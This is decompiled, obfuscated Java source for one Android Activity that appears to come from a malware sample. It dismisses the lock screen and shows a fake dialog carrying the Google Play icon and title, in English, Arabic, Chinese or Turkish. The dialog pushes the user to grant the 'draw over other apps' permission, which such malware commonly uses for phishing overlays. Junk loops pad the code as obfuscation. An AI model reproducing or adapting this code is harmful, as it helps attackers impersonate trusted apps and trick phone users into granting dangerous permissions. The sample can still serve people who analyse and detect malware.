package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2;

import android.app.Activity;
import android.app.AlertDialog;
import android.app.KeyguardManager;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.ContextThemeWrapper;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0045d;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72;
import java.util.Locale;
import org.chromium.net.C0116R;
/* loaded from: classes.dex */
public class auovoogrebmqwkwsmselrarelqskmfcqktttiwyfexhmhvimcl22 extends Activity {

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.auovoogrebmqwkwsmselrarelqskmfcqktttiwyfexhmhvimcl22$a */
    /* loaded from: classes.dex */
    public class DialogInterface$OnClickListenerC0033a implements DialogInterface.OnClickListener {
        DialogInterface$OnClickListenerC0033a() {
        }

        @Override // android.content.DialogInterface.OnClickListener
        public void onClick(DialogInterface dialogInterface, int i) {
            hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f316l = Boolean.TRUE;
            auovoogrebmqwkwsmselrarelqskmfcqktttiwyfexhmhvimcl22.this.startActivityForResult(new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION", Uri.parse("package:" + auovoogrebmqwkwsmselrarelqskmfcqktttiwyfexhmhvimcl22.this.getPackageName())), 0);
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.auovoogrebmqwkwsmselrarelqskmfcqktttiwyfexhmhvimcl22$b */
    /* loaded from: classes.dex */
    public class DialogInterface$OnClickListenerC0034b implements DialogInterface.OnClickListener {
        DialogInterface$OnClickListenerC0034b(auovoogrebmqwkwsmselrarelqskmfcqktttiwyfexhmhvimcl22 auovoogrebmqwkwsmselrarelqskmfcqktttiwyfexhmhvimcl22Var) {
        }

        @Override // android.content.DialogInterface.OnClickListener
        public void onClick(DialogInterface dialogInterface, int i) {
        }
    }

    /* renamed from: a */
    private void m262a() {
        char c;
        String str;
        String language = Locale.getDefault().getLanguage();
        AlertDialog.Builder builder = new AlertDialog.Builder(new ContextThemeWrapper(this, (int) C0116R.style.AlertDialogCustom));
        int hashCode = language.hashCode();
        if (hashCode == 3121) {
            if (language.equals("ar")) {
                c = 1;
            }
            c = 65535;
        } else if (hashCode == 3179) {
            if (language.equals("cn")) {
                c = 2;
            }
            c = 65535;
        } else if (hashCode != 3241) {
            if (hashCode == 3710 && language.equals("tr")) {
                c = 3;
            }
            c = 65535;
        } else {
            if (language.equals("en")) {
                c = 0;
            }
            c = 65535;
        }
        String str2 = "Cancel";
        if (c == 0) {
            builder.setMessage("Enable Draw Over Apps For: " + getString(C0116R.string.subscriberf62));
            str = "Enable";
        } else if (c == 1) {
            builder.setMessage("تمكين ، الإظهار فوق التطبيقات لـ: " + getString(C0116R.string.subscriberf62));
            str = "تفعيل";
            str2 = "إلغاء";
        } else if (c == 2) {
            builder.setMessage("请启用，显示在应用程序:" + getString(C0116R.string.subscriberf62));
            str = "使能够";
            str2 = "取消";
        } else if (c != 3) {
            builder.setMessage("Enable Draw Over Apps For: " + getString(C0116R.string.subscriberf62));
            str = "OK";
        } else {
            builder.setMessage("diğer uygulamalar üzerinde çizimi etkinleştir:" + getString(C0116R.string.subscriberf62));
            str = "Tamam";
            str2 = "iptal";
        }
        try {
            try {
                builder.setIcon(hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.f285s.getPackageManager().getApplicationIcon("com.android.vending"));
                builder.setTitle("Google Play");
            } catch (PackageManager.NameNotFoundException unused) {
                Boolean bool = Boolean.TRUE;
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
            }
        } catch (PackageManager.NameNotFoundException unused2) {
            builder.setIcon(hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq71.f285s.getPackageManager().getApplicationIcon(getPackageName()));
            builder.setTitle(getString(C0116R.string.subscriberf62));
        }
        builder.setPositiveButton(str, new DialogInterface$OnClickListenerC0033a());
        builder.setNegativeButton(str2, new DialogInterface$OnClickListenerC0034b(this));
        builder.show();
    }

    @Override // android.app.Activity
    public void finish() {
        C0045d.f182W = Boolean.FALSE;
        if (Build.VERSION.SDK_INT >= 21) {
            super.finishAndRemoveTask();
        } else {
            super.finish();
        }
    }

    @Override // android.app.Activity
    protected void onActivityResult(int i, int i2, Intent intent) {
        super.onActivityResult(i, i2, intent);
        if (i == 0) {
            if (i2 == -1) {
                hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f316l = Boolean.FALSE;
                finish();
            } else if (i2 == 0) {
                finish();
                hfkhemryndolqhokauqjdnatdovpuexoqsztreplifugpcotlq72.f316l = Boolean.FALSE;
            }
        }
    }

    @Override // android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        requestWindowFeature(1);
        getWindow().setFlags(1024, 1024);
        try {
            try {
                try {
                    if (Build.VERSION.SDK_INT >= 27) {
                        getWindow().addFlags(1024);
                        ((KeyguardManager) getApplicationContext().getSystemService("keyguard")).requestDismissKeyguard(this, null);
                        setShowWhenLocked(true);
                    } else {
                        getWindow().setFlags(1024, 6816768);
                    }
                } catch (Exception unused) {
                    Boolean bool = Boolean.TRUE;
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                    while (bool.booleanValue()) {
                        bool = Boolean.FALSE;
                    }
                }
            } catch (Exception unused2) {
                getWindow().setFlags(1024, 6816768);
            }
        } catch (Exception unused3) {
            getWindow().setFlags(1024, 1024);
        }
        try {
            if (Build.VERSION.SDK_INT < 23 || Settings.canDrawOverlays(this)) {
                finish();
            } else {
                m262a();
            }
        } catch (Exception unused4) {
        }
    }
}
